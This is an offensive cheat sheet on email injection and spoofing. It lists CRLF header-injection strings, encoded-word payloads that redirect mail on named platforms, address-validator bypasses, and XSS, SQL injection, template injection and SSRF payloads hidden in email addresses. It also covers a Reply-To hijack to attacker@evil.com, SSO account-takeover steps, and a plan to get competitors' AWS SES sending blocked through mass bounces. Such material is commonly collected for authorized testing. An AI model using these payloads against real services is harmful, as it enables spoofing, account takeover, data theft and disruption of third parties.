## Overview

**Email injection** attacks manipulate email headers, parameters, or addresses to bypass security controls, spoof senders, inject malicious content, or gain unauthorized access.

**Email spoofing** tricks users into thinking a message came from a trusted source by forging email headers. Works when SPF/DMARC records are missing or misconfigured.

**Key vulnerability conditions:**

- Missing or weak SPF/DMARC records
- Unvalidated email inputs in applications
- Poor sanitization of email parameters (especially PHP `mail()` function)
- Email verification bypass opportunities

---

## Detection & Reconnaissance

### **Check SPF Records**

**Vulnerable if:**

- No SPF record exists
- SPF never specifies `-all` or `~all`

Example secure SPF:

```
v=spf1 include:_spf.google.com ~all
```

### **Check DMARC Records**

**Vulnerable if:**

- No DMARC record exists
- Policy is set to `p=none`

Example weak DMARC:

```
v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com
```

### **Tools for Testing**

```bash
# Automated SPF/DMARC checker
https://github.com/BishopFox/spoofcheck

# Manual lookup
https://mxtoolbox.com
- DMARC lookup
- SPF Record lookup
```

### **Find Target Emails**

Common accounts to test:

```
support@, jira@, print@, feedback@, asana@
slack@, hello@, bugs@, upload@, service@
it@, test@, help@, tickets@, tweet@
```

Use **Hunter.io extension** to discover company emails.

---

## Exploitation Methods

### **1. Email Spoofing (Send as Company)**

**When vulnerable:** No SPF + No DMARC (or `p=none`)

**Exploit site:**

```
http://emkei.cz
```

Send emails appearing to come from `admin@targetcompany.com`

---

### **2. Header Injection**

Inject additional headers by adding line breaks (`%0A` or `\r\n`):

**Inject Cc/Bcc:**

```
From:sender@domain.com%0ACc:attacker@domain.com,%0ABcc:attacker2@domain.com
```

**Inject To:**

```
From:sender@domain.com%0ATo:attacker@domain.com
```

**Inject Subject:**

```
From:sender@domain.com%0ASubject:Fake%20Subject%20Here
```

**Change Body:**

```
From:sender@domain.com%0A%0AMy%20injected%20message%20body.
```

**Advanced Header Injection:**

```
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```

---

### **3. PHP mail() Function Exploitation**

**Target:** 5th parameter (`$additional_parameters`)

Though sanitized with `escapeshellcmd()`, you can **inject sendmail parameters** to leak files or achieve RCE.

**Read more:**

```
https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html
```

Exploitation depends on MTA installed (Sendmail, Postfix, Exim).

---

### **4. Email Name Injection**

**Ignored characters:**

- `+`, `-`, `{}` → Used for tagging, ignored by servers
    
    - `john.doe+tag@example.com` → `john.doe@example.com`
- **Comments in parentheses** → Ignored
    
    - `john.doe(comment)@example.com` → `john.doe@example.com`

**IP-based domains:**

```
john.doe@[127.0.0.1]
john.doe@[IPv6:2001:db8::1]
```

---

### **5. Email Encoding Attacks**

**Format:**

```
=?utf-8?q?=41=42=43?=hi@example.com → ABChi@example.com
```

**Structure:**

```
=? → Start
utf-8 → Encoding
? → Separator
q → Type (q=quoted-printable, b=base64)
? → Separator
=41=42=43 → Hex encoded data
?= → End
```

**Real-world payloads:**

GitHub bypass:

```
=?x?q?collab=40psres.net=3e=00?=foo@example.com
→ Sends to collab@psres.net
```

Zendesk bypass:

```
"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com
→ Sends to collab@psres.net
```

GitLab bypass:

```
=?x?q?collab=40psres.net_?=foo@example.com
→ Sends to collab@psres.net (underscore = space separator)
```

**Punycode injection:**

```
x@xn--svg/-9x6 → x@<svg/
```

Can inject tags like `<style` for CSS exfiltration.

**PHP 256 overflow:**

```javascript
String.fromCodePoint(0x10000 + 0x40) // → @
```

---

## Bypasses

### **Whitelist Bypass**

```
inti(;inti@inti.io;)@whitelisted.com
inti@inti.io(@whitelisted.com)
inti+(@whitelisted.com;)@inti.io
```

### **Strict Validator Bypass**

Use **quotes:**

```
"arbitrary@domain.com"@whitelisted.com
```

### **Wildcard Abuse**

```
%@example.com
```

### **Parameter Pollution**

```
victim&email=attacker@example.com
```

---

## Payloads (Top 10 Modern)

### **XSS**

```
test+(alert(0))@example.com
test@example(alert(0)).com
"alert(0)"@example.com
<script src=//xss.ht>@email.com
```

### **Template Injection**

```
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com
```

### **SQLi**

```
"' OR 1=1 -- '"@example.com
"mail'); SELECT version();--"@example.com
a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1"@a.com
```

### **SSRF**

```
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```

### **HTML Injection (Gmail)**

```
user+(<b>bold<u>underline<s>strike<br/>newline)@gmail.com
```

---

## Higher Impact Scenarios

### **SSO Account Takeover**

If an SSO provider (like **Salesforce**) lets you create accounts **without email verification**, you can:

1. Create account: `victim@targetcompany.com`
2. Use SSO to login to services trusting that provider
3. **Access victim's account** (since email isn't verified)

### **XSS via SSO**

Services like **GitHub** and **Salesforce** allow XSS payloads in email addresses:

- Create account with XSS in email
- Login to other services using SSO
- If they don't sanitize → **Stored XSS**

### **Reply-To Hijacking**

Send email with:

```
From: internal@company.com
Reply-To: attacker@evil.com
```

If automatic replies are sent → **attacker receives internal data**

### **Hard Bounce Rate Abuse (AWS SES)**

Send emails to **100 invalid addresses** out of 1000 total → **10% hard bounce rate** → AWS blocks sending.

**Attack:** Trigger blocks on competitor services by causing mass hard bounces.

---

## Tools

**Burp Suite:**

- **Turbo Intruder script** for fuzzing email formats
- **Hackvertor extension** for email splitting attacks

**Automated checks:**

```bash
https://github.com/BishopFox/spoofcheck
```

---

## References

- HackerOne Report #1071521
- [Pwning PHP Mail Function](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [Email Atom Splitting Research](https://portswigger.net/research/splitting-the-email-atom)
- [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types)